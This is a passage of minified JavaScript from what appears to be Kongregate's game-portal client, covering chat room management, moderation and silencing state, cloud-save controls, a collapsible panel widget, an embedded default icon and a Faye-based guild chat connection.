0<=o.indexOf(n)&&active_user.isChatModerator()&&(o.reject(a).each((function(e){(s=t.roomByType(e))&&holodeck.setPresenceAway(s.xmppName())})),o.filter(a).each((function(e){(s=t.roomByType(e))&&holodeck.setPresenceChat(s.xmppName())}))),s?(t.setActiveRoom(s),t.activeChatDialogue().focus()):(t.joinDeferredRoom(n),function(){t.activeChatDialogue().focus()}.delay(.2)),Event.stop(i),!1}))}))},roomByType:function(e){return this._rooms_by_type[e]},hasJoinedAnyRooms:function(){return 0<this._rooms.size()},requestRoomToJoin:function(){new Ajax.Request(this._chat_bootstrap_url,{method:"post",parameters:{choose_room:!0}})},bootstrapChat:function(e){var t=this._chat_bootstrap_url,i=Cookie.get("kong_room_id"),n={};i&&(n.room_id=i),e&&(n.gameplay_id=this._holodeck.gameplay(),n.reload=!0,this._mini_profile.deactivate(),this._room_info.deactivate(),this._room_chooser.deactivate()),new Ajax.Request(t,{method:"post",parameters:n})},findOrCreateRoom:function(e){if(!e.id)return null;e.owner=this.roomOwner(e.id);var t=this._rooms.get(e.id);return t||(t=new ChatRoom(this,e),this._rooms.set(e.id,t),$("chat_window_header").show()),t},joinedRoom:function(e){var t=this.roomByType(e.type),i=this.findOrCreateRoom(e);if(i&&i!=t){if(this._rooms_by_type[e.type]=i,this.setActiveRoom(i),this.authenticated()&&("private"!=i.type()&&t&&this.updateLastActionTaken(),this.startBeacon()),this.GAME_CHAT_ROOM!=e.type||!this._hide_first_game_room_join)return this.tabForRoom(i).show(),i;this._hide_first_game_room_join=!1}},holodeck:function(){return this._holodeck},authenticated:function(){return this._holodeck.authenticated()},isAdmin:function(e){return this._active_room.user(e).isAdmin()},setLastViewedTabCookie:function(e){Cookie.set(this.LAST_VIEWED_TAB_COOKIE,e,void 0,"/games")},getLastViewedTabCookie:function(){return Cookie.get(this.LAST_VIEWED_TAB_COOKIE)},setActiveRoom:function(e){var t=e.type();this._active_room=e,this.setLastViewedTabCookie(t),this._holodeck._active_dialogue=e._chat_dialogue,this.showActiveRoom()},showActiveRoom:function(){var e=this,t=this._active_room;this.activeTempPane();var i=this._holodeck;this._rooms.values().each((function(n){n==t?n.show():n.hide(),n.disconnectedFromFaye?n.disableDueToFayeDisconnect():e.isSilenced()&&!n.isPrivate()?n.disableDueToSilence():i.authenticated()?n.enable():n.disableDueToGuest()}))},fayeDisconnect:function(e){(e=this.roomByType("guild"))&&e.disableDueToFayeDisconnect()},fayeConnect:function(e){(e=this.roomByType("guild"))&&e.enableDueToFayeConnect()},activatePrivateRoom:function(){this.canActivatePrivateRoom()&&this.roomByType("private")&&this.setActiveRoom(this.roomByType("private"))},canActivatePrivateRoom:function(){return this.roomByType("private")&&this._active_room!=this.roomByType("private")},leftRoom:function(e){var t=e.room,i=this._rooms.get(t.id),n=i?i.type():void 0;if("private"==n||"guild"==n){var s=this.roomByType(n);s&&s.xmppName()==t.xmpp_name&&(this.tabForRoom(s).hide(),this.setFirstAvailableRoomAsActive(["game","chat"]),delete this._rooms_by_type[n])}if(e.kicked)(function(e){e.activeChatDialogue().displayMessage("Kong Bot","You have been removed from "+t.name+".",{class:"whisper received_whisper"},{non_user:!0})}).defer(this);else if(i&&i.isPrivate()&&!i.isMyPrivateRoom()&&(e.owner_destroyed||e.owner_left)){var o=i;(function(e){var t=o.privateRoomOwnerUsername()||"The room owner";o=void 0,e.activeChatDialogue().displayMessage("Kong Bot",t+" has left the room and the private session has ended.",{class:"whisper received_whisper"},{non_user:!0})}).defer(this)}this._rooms.unset(t.id),i&&(i.destroy(),i=void 0),0===this._rooms.keys().length&&$("chat_window_header").hide()},setFirstAvailableRoomAsActive:function(e){var t,i,n=this;e.find((function(e){return!!(t=n.roomByType(e))}))?this.setActiveRoom(t):e.find((function(e){return(t=n.hasDeferredRoom(e))&&(i=e),!!t}))&&this.joinDeferredRoom(i)},errorMessageTemplate:function(e){if(this._error_message_templates_node||(this._error_message_templates_node=this._node.down(".chat_error_message_templates")),e=this._error_message_templates_node.down("."+e))return e.cloneNode(!0)},konduit:function(){return this._holodeck.konduit()},userJoinedRoom:function(e){this.withRoom(e,"userJoined")},userLeftRoom:function(e){this.withRoom(e,"userLeft")},userChangedInRoom:function(e){this.withRoom(e,"userChanged")},updateGuestCount:function(e){this.withRoom(e,"guestCountUpdated")},receivedRoomMessage:function(e){this.withRoom(e,"receivedMessage")},receivedSystemMessage:function(e){this.withRoom(e,"receivedSystemMessage")},receivedAdminMessage:function(e){this._active_room&&this._active_room.receivedAdminMessage(e)},receivedPrivateRoomInvitation:function(e){var t=this.roomByType("private");if(!t||!t.isPrivateRoomOwner(e.username)){var i=new Element("div").update(new Template($("chat_notification_received_private_message").innerHTML).evaluate({username:e.username})),n=i.down(".yes"),s=i.down(".no"),o=function(e){return i.hide(),n.stopObserving("click"),s.stopObserving("click"),Event.stop(e),!1};t&&n.update("Leave "+t.name()+" and join"),n.observe("click",(function(t){return holodeck.joinRoom(e),o(t)})),s.observe("click",(function(t){return holodeck.invitationIgnoredBy(e.username),o(t)})),this.activeChatDialogue().insert(i)}},roomNotFound:function(e){(function(t){var i="guild"===e.type?"Could not connect to guild chat. If this problem persists, refresh the page and try again.":e.name+" is no longer available.",n=t.activeChatDialogue();n&&n.displayMessage("Kong Bot",i,{class:"whisper received_whisper"},{non_user:!0}),t.roomJoinFail(e.type)}).defer(this)},roomJoinFail:function(e){this.GUILD_CHAT_ROOM!=e&&this.PRIVATE_CHAT_ROOM!=e||(this.tabForType(e).hide(),this.activeChatDialogue()||this.joinDeferredRoom(this.GENERAL_CHAT_ROOM))},roomFull:function(e){(function(t){var i=e.name+" is full. Please try again later.";t.activeChatDialogue().displayMessage("Kong Bot",i,{class:"whisper received_whisper"},{non_user:!0})}).defer(this)},onPrivateRoomInvitationSent:function(e){var t=e.error;e=e.success?e.username+" was invited to join your private chat room.":"user_in_room"==t?e.username+" is already in your private chat room.":e.username+" cannot be reached. Please try again later",this.activeChatDialogue().displayMessage("Kong Bot",e,{class:"whisper received_whisper"},{non_user:!0})},activeChatDialogue:function(){if(this._active_room)return this._active_room._chat_dialogue},room:function(e){return this._rooms.get(e)},withRoom:function(e,t){var i=this.room(e.data.room.id);i||(i=this.findOrCreateRoom(e.data.room)),i&&i[t](e)},addFriends:function(e){var t=this._friends;e.each((function(e){t[e.toLowerCase()]=!0})),this._rooms.values().each((function(t){t.addFriends(e)}))},removeFriends:function(e){var t=this._friends;e.each((function(e){t[e.toLowerCase()]=!1})),this._rooms.values().each((function(t){t.removeFriends(e)}))},addMutings:function(e){var t=this._mutings;e.each((function(e){t[e.toLowerCase()]=!0})),this._rooms.values().each((function(t){t.addMutings(e)}))},addFavoriteRooms:function(e){this._favorite_rooms=this._favorite_rooms.concat(e);var t=this._rooms;e.each((function(e){(e=t.get(e))&&(e._favorite_room=!0)}))},removeFavoriteRoom:function(e){this._rooms.get(e)._favorite_room=!1,this._favorite_rooms=this._favorite_rooms.reject((function(t){return t==e}))},removeMutings:function(e){var t=this._mutings;e.each((function(e){delete t[e.toLowerCase()]})),this._rooms.values().each((function(t){t.addMutings(e)}))},isFavoriteRoom:function(e){return void 0!==this._favorite_rooms.find((function(t){return t==e}))},isFriend:function(e){return!0===this._friends[(e.username?e.username:e).toLowerCase()]},isMuted:function(e){return!!e&&!0===this._mutings[(e.username?e.username:e).toLowerCase()]},isGuest:function(e){return this._holodeck.isGuestUsername(e.username)},onSilenced:function(e){this._silenced=!0,this.updateSilenceScheduledEnd(e.data.scheduled_end),this._rooms.values().each((function(e){e.isPrivate()||e.disableDueToSilence()}))},onParticipate:function(e){this._silenced=!1,this._rooms.values().each((function(e){e.enable()}))},isSilenced:function(){return this._silenced},updateSilenceScheduledEnd:function(e){var t=TimeInWordsHelper.distanceInWordsFromNow(new Date(e));this._rooms.values().each((function(e){e.updateSilenceScheduledEnd(t)})),ChatRoom.updateTemplateSilenceScheduledEnd(t)},username:function(){if(this._holodeck)return this._holodeck.username()},processRoomEvent:function(e){this._room_chooser.deactivate(),this._seen&&this._logged_in_to_chat?this.konduit().dispatchEvent(e):this._rooms_to_join.push(e)},setRooms:function(e){var t=e.defaultRooms;this.clearRoomsToJoin(),this.roomByType(this.GENERAL_CHAT_ROOM)||this.setDeferredRoomParams(this.GENERAL_CHAT_ROOM,t.generalChatRoom),e.currentGameType=this.SINGLE_PLAYER_GAME,e.gameRoomEnabled&&(this.roomByType(this.GAME_CHAT_ROOM)||this.determineGameChatRoom(e),e.currentGameType=this.MULTIPLAYER_GAME),this.roomByType(this.GUILD_CHAT_ROOM)||this.determineGuildChatRoom(e),t.guildChatRoom&&(e.currentGameType=this.GUILD_GAME),!this.roomByType(this.PRIVATE_CHAT_ROOM)&&e.previousPrivateRoom&&this.setDeferredRoomParams(this.PRIVATE_CHAT_ROOM,e.previousPrivateRoom,e.previousPrivateRoomCallback),e.mostRecentChatTab=this.getLastViewedTabCookie()||this.GENERAL_CHAT_ROOM,this.hasJoinedAnyRooms()||this.joinActiveRoomType(e)},joinActiveRoomType:function(e){var t=this._activeTabMatrix[e.currentGameType][e.mostRecentChatTab];e=this.hasDeferredRoom(t)?t:this._activeTabMatrix[e.currentGameType][this.GENERAL_CHAT_ROOM],this.GUILD_CHAT_ROOM==e&&this._deferred_room_params[this.GAME_CHAT_ROOM]&&(this._hide_first_game_room_join=!0,this.joinDeferredRoom(this.GAME_CHAT_ROOM)),this.joinDeferredRoom(e)},determineGameChatRoom:function(e){this.setDeferredRoomParams(this.GAME_CHAT_ROOM,e.previousGameRoom?e.previousGameRoom:e.defaultRooms.gameChatRoom?e.defaultRooms.gameChatRoom:e.gameRoomJoin)},determineGuildChatRoom:function(e){if(e.previousGuildChatRoomForCurrentGame)var t=e.previousGuildChatRoomForCurrentGame,i=e.previousGuildChatRoomForCurrentGameCallback;else e.defaultRooms.guildChatRoom?t=e.defaultRooms.guildChatRoom:e.previousSitewideGuildChatRoom&&(t=e.previousSitewideGuildChatRoom,i=e.previousSitewideGuildChatRoomCallback);t&&this.setDeferredRoomParams(this.GUILD_CHAT_ROOM,t,i)},hasDeferredRoom:function(e){return!!this._deferred_room_params[e]},joinDeferredRoom:function(e){var t=this._deferred_room_params[e];this._deferred_room_params[e]=void 0;var i=this._deferred_room_callbacks[e];i&&i(),this._deferred_room_callbacks[e]=void 0,this.joinRoom(t)},joinRoom:function(e){"guild"===e.type?this.processRoomEvent({type:KonduitEvent.JOIN_GUILD_ROOM,data:{guildId:e.guild_id}}):(this.addRoomOwner(e),this.room(e.id)||this.processRoomEvent({type:KonduitEvent.JOIN_ROOM,data:{room:e}}))},setDeferredRoomParams:function(e,t,i){e!=this.PRIVATE_CHAT_ROOM&&this.tabForType(e).show(),this._deferred_room_params[e]=t,this._deferred_room_callbacks[e]=i},sendPrivateMessage:function(e,t){e&&t&&this.konduit().dispatchEvent({type:KonduitEvent.PRIVATE_MESSAGE,data:{message:this.escapeOutgoingMessage(t),username:e}})},escapeOutgoingMessage:function(e){return e.replace(/\\(?!u[0-9a-fA-f]{4}|x[0-9a-fA-f]{2})/g,"\\\\")},onLogin:function(){this._logged_in_to_chat=!0,this.joinRequestedRooms()},onLogout:function(){this._logged_in_to_chat=!1},joinRequestedRooms:function(){if(this._seen&&this._logged_in_to_chat){for(var e=this._rooms_to_join.length-1;0<=e;e--)this.processRoomEvent(this._rooms_to_join[e]);this.clearRoomsToJoin()}},clearRoomsToJoin:function(){this._rooms_to_join=[]},activateRoomChooser:function(){this.recordAnalyticsEvent("ChatAction","RoomList"),this._room_chooser.activate(this._active_room)},hideChatWindow:function(){this._chat_window_node.hide()},showChatWindow:function(){this._chat_window_node.show(),this.scrollToBottom()},tabForRoom:function(e){return this.tabForType(e.type())},tabForType:function(e){return $(e+"_room_tab")},messageError:function(e){this._active_room&&this._active_room.messageError(e)},roomGroups:function(e){this._room_chooser.roomGroups(e)},redoRoomList:function(){this._room_chooser.redoRoomList()},showChatNag:function(e,t){this._active_room&&this._active_room.showChatNag(e,t)},showUserRollover:function(e,t){this._user_rollover_manager.show(e,t)},hideUserRollover:function(){this._user_rollover_manager.beginHide()},addRoomOwner:function(e){this._room_owners[e.id]=e.owner},roomOwner:function(e){return this._room_owners[e]},insertPrivateMessagePrefixFor:function(e){this.insertInActiveChatInput("/w "+e+" ")},insertInActiveChatInput:function(e){this._active_room&&this._active_room.insertInChatInput(e)},insert:function(e){this._active_room&&this._active_room.insert(e)},updateRolloverMutingLink:function(e){this._user_rollover_manager.updateMutingLink(e)},activeRoomUserListScrollTop:function(){return this._active_room.userListScrollTop()},showProfile:function(e){this.recordAnalyticsEvent("ChatAction","Profile"),this._mini_profile.activate(e,this._active_room)},showSpinner:function(){$("chat_window_spinner").show()},hideSpinner:function(){$("chat_window_spinner").hide()},showOnlineFriends:function(){this.recordAnalyticsEvent("ChatAction","FriendsList"),this._online_friends.activate(this._active_room.name())},loadFriendsPage:function(e){this._online_friends.getOnlineFriends(e)},updateLastActionTaken:function(){var e={method:"post",parameters:{game_id:this.gameId()}},t=this.activeRoom();update=!1,t&&("chat"==t.type()&&(e.parameters.room=t._room.id,update=!0),"game"==t.type()&&(e.parameters.game_room=t._room.id,update=!0),update&&new Ajax.Request("/last_action_taken/update",e))},activeRoomUsernameNode:function(e){return $(this._active_room.usernameNodeId(e))},activeRoom:function(){return this._active_room},startBeacon:function(){this._last_action_beacon&&this._last_action_beacon.stop();var e=this;this._last_action_beacon=new PeriodicalExecuter((function(){e.updateLastActionTaken()}),600)},setupBanAndSilencingControls:function(){this._mini_profile.setupBanAndSilencingControls()},gameId:function(){return this._holodeck.gameId()},deactivateMiniProfile:function(){this._mini_profile.deactivate()},activateRoomInfo:function(e){this.recordAnalyticsEvent("ChatAction","RoomDetails"),this._room_info.activate(e)},scrollToBottom:function(){this._rooms.each((function(e){e.value.scrollToBottom()}))},deactivateRoomChooser:function(){this._room_chooser.deactivate()},recordAnalyticsEvent:function(e,t){this._holodeck.recordAnalyticsEvent(e,t)},restoreDefaultView:function(){this.clearActiveTempPane(),this.hideSpinner(),this._chat_tab_clicked=!0,this._mini_profile._container.hide(),this._room_chooser.hide(),this._room_info._container.hide(),this._online_friends._container.hide(),this.showChatWindow()},setActiveTempPane:function(e){this._active_temp_pane=e},clearActiveTempPane:function(){this._active_temp_pane=null},activeTempPane:function(){return this._active_temp_pane},noticedModeratableUser:function(e){active_user.isSuperChatModerator()||(this._moderatableUsers[e]=new Date,this.conditionallyStartModeratableSweeper())},isModeratableUser:function(e){return!!active_user.isSuperChatModerator()||!!this._moderatableUsers[e]},conditionallyStartModeratableSweeper:function(){this._moderatableUsersSweeper||(this._moderatableUsersSweeper=new PeriodicalExecuter(function(e){for(var t in e=new Date,this._moderatableUsers)e-this._moderatableUsers[t]>ChatWindow.MODERATABLE_TIME_LIMIT&&delete this._moderatableUsers[t]}.bind(this),60))}},this.Kongregate=this.Kongregate||{},this.Kongregate.CloudSavesController={modeDetermined:function(e,t,i){active_user.areCloudSavesEnabled()&&(holodeck&&holodeck.ready?("localOnly"==e?(i?holodeck.showCloudSavesTab("promptForLogin",{lastUsername:i}):holodeck.showCloudSavesTab(t?"loadConflict":e),holodeck.showCloudSavesIndicator("localOnly")):"debug"!=e&&holodeck.showCloudSavesIndicator(e),"remoteOnly"!=e&&"sync"!=e&&"debug"!=e||KONGREGATE.cloudSavesHandler.beginPolling()):document.observe("holodeck:ready",this.modeDetermined.bind(this,e,t,i)))},setMode:function(e){gameLoader.setSyncMode(e),"remoteOnly"==e?holodeck.showCloudSavesTab(e):holodeck.closeCloudSavesTab(),holodeck.showCloudSavesIndicator(e)},syncStarted:function(){holodeck.showCloudSavesIndicator("syncing")},syncEnded:function(e){holodeck.showCloudSavesIndicator(e?gameLoader.getSyncMode():"error")},handleConflict:function(){isDebug||(holodeck.showCloudSavesIndicator("error"),holodeck.showCloudSavesTab("saveConflict"))},forceUpdates:function(){KONGREGATE.cloudSavesHandler.forceUpdates(),"remoteOnly"==KONGREGATE.cloudSavesHandler.getSyncMode()?holodeck.showCloudSavesTab("remoteOnly"):holodeck.closeCloudSavesTab()},reloadCloudSaves:function(){gameLoader.reloadCloudSaves(),"remoteOnly"==KONGREGATE.cloudSavesHandler.getSyncMode()?holodeck.showCloudSavesTab("remoteOnly"):holodeck.closeCloudSavesTab()},upgradeToSync:function(e){gameLoader.upgradeToSync(e)},remoteWatermark:function(){return cloudSaves.syncWatermark?moment(cloudSaves.syncWatermark).format("MMMM Do, YYYY"):"unknown"},localWatermark:function(){var e=KONGREGATE.cloudSavesHandler.localWatermark();return e&&!isNaN(e)?moment(e).format("MMMM Do, YYYY"):"unknown"},userAuthenticated:function(){active_user.areCloudSavesEnabled()&&gameLoader.refreshCloudData((function(){0===cloudSaves.syncWatermark?holodeck.showCloudSavesTab("noCloudSave"):(holodeck.showCloudSavesTab("authenticated",{username:active_user.username()}),jQuery(".js-last-cloud-save-date").html(Kongregate.CloudSavesController.remoteWatermark()),jQuery(".js-last-local-save-date").html(Kongregate.CloudSavesController.localWatermark()))}))},reloadGame:function(){gameLoader.reloadGame()}},CollapsiblePanel=function(e,t){this.initialize(e,t)},CollapsiblePanel.prototype={initialize:function(e,t){this.element=$(e),this.toggle_callback=t,this.element.panel=this,this.handle=this.element.down(".panel_handle"),this.body=this.element.down(".panel_body");var i=this;this.handle.observe("click",(function(e){i.toggle(),e.stop()})),this.collapsed()?this.collapse():this.open()},collapsed:function(){return this.handle.hasClassName("closed_link")},collapse:function(){this.body.hide(),this.handle.removeClassName("opened_link"),this.handle.addClassName("closed_link")},open:function(){this.body.show(),this.handle.removeClassName("closed_link"),this.handle.addClassName("opened_link")},toggle:function(){this.toggle_callback&&this.toggle_callback(),this.collapsed()?this.open():this.collapse()},scrollTab:function(e){e.scrollTop=this.handle.positionedOffset()[1]-parseInt(this.handle.getStyle("margin-top"),10)}},Kongregate.DEFAULT_ICON_BASE64="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",window.lightboxController={closeLightboxWithResult:function(e,t){parent.parent.lightbox.prototype.shutdown()}},void 0===window.DOMParser&&window.ActiveXObject&&(DOMParser=function(){},DOMParser.prototype.parseFromString=function(e,t){return(t=new ActiveXObject("Microsoft.XMLDOM")).async="false",t.loadXML(e),t}),FayeConnection=function(e){this.initialize(e)},FayeConnection.DISCONNECT_TIMEOUT=2e4,FayeConnection.prototype={initialize:function(e){this._authenticator=e.authenticator,this._resetReauthenticateBackOffPeriod(),this._pendingMessages={}},subscribe:function(e){var t=this;return this._authenticator.authenticate(e.guildId).then((function(i){return t._subscribe(new GuildRoom(e.guildId,i.guild_name))}))},disconnect:function(){this._client&&(this._connectionMonitor.destroy(),this._connectionMonitor=null,this._client._state=this._client.DISCONNECTED,this._client._dispatcher.close(),this._pendingMessages={},this._activeRoom=this._client=null)},sendMessage:function(e,t){return this._client.publish(t.id,{text:e},{deadline:FayeConnection.DISCONNECT_TIMEOUT/1e3}).then(null,(function(e){throw{rateLimited:429===e.code}}))},setPresence:function(e,t){t?this.activeRoom=e:e===this.activeRoom&&(this.activeRoom=null)},_connect:function(e){var t=this;this._room=e,this._client=new Faye.Client(window.FAYE_CONFIG.KWAK_SERVICE_URL+"/faye",{scheduler:FayeBackoffScheduler}),this._connectionMonitor=new FayeConnectionMonitor({client:this._client,timeout:FayeConnection.DISCONNECT_TIMEOUT}),this._client.addExtension({incoming:this._errorDetectionExtension.bind(this),outgoing:this._outgoingExtension.bind(this)}),this._client.addExtension({incoming:this._roomHistoryExtension.bind(this)}),this._connectionMonitor.on("disconnect",(function(){t.trigger("disconnect")})),this._connectionMonitor.on("connect",(function(){t.trigger("connect")}))},_subscribe:function(e){var t=$j.Deferred(),i=this,n=!1,s=setTimeout((function(){t.reject()}),3e4);return this._connect(e),this._pendingMessages[e.id]=[],this._client.subscribe(e.id,(function(t){t=FayeMessageTransformer.transform(t),n?i.trigger("message",e,t):i._pendingMessages[e.id].push(t)})).then((function(){var o=i._pendingMessages[e.id];t.resolve(e);for(var a=0;a<o.length;a++)i.trigger("message",e,o[a]);n=!0,clearTimeout(s),delete i._pendingMessages[e.id]})),t.then(null,(function(){i.disconnect()}))},_reconnect:function(e){var t=this;this.disconnect(),this._reauthenticationTimeout||(this._reauthenticationTimeout=setTimeout((function(){t._authenticator.reauthenticate().then((function(){t._subscribe(e)})),t._reauthenticationTimeout=null}),Math.min(this._reauthenticateBackOffPeriod,3e5)),this._reauthenticateBackOffPeriod*=2)},_resetReauthenticateBackOffPeriod:function(){this._reauthenticateBackOffPeriod=500},_errorDetectionExtension:function(e,t){void 0!==e.error&&null!==e.error&&(error=Faye.Error.parse(e.error),403===error.code?(e.advice={reconnect:"none"},this._reconnect(this._room)):this._resetReauthenticateBackOffPeriod()),t(e)},_roomHistoryExtension:function(e,t){if("/meta/subscribe"===e.channel&&e.successful){var i=e.ext,n=e.subscription;i&&i.history&&(i=$j.map(i.history,(function(e,t){return(e=FayeMessageTransformer.transform(e)).history=!0,e})),this._pendingMessages[n]=i.concat(this._pendingMessages[n]))}t(e)},_outgoingExtension:function(e,t){void 